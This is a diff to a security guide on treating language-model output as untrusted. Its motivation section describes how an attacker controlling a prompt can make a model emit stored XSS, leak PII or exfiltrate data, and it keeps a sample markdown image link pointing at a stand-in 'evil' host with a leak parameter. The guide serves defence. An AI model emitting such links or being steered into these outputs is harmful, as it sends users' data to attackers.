@@ -7,7 +7,7 @@ description: Treat model output as untrusted — sanitize HTML/markdown, validat
 
 ## Motivation
 
-Model output is rendered in *your* UI, logged in *your* systems, and parsed by *your* code. An attacker who controls the prompt can steer the output to carry **stored XSS** (`<script>`), **markdown data-exfiltration** (`![x](https://evil/leak?d=…)` makes the victim's client fetch an attacker URL), or **leaked PII**. None of that is the model's fault to fix — the output is untrusted, full stop.
+Model output is rendered in *your* UI, logged in *your* systems, and parsed by *your* code. An attacker who controls the prompt can steer the output to carry **stored XSS** (for example a script tag), **markdown data-exfiltration** (`![x](https://evil/leak?d=...)` makes the victim's client fetch an attacker URL), or **leaked PII**. None of that is the model's fault to fix — the output is untrusted, full stop.
 
 ## Theory
 
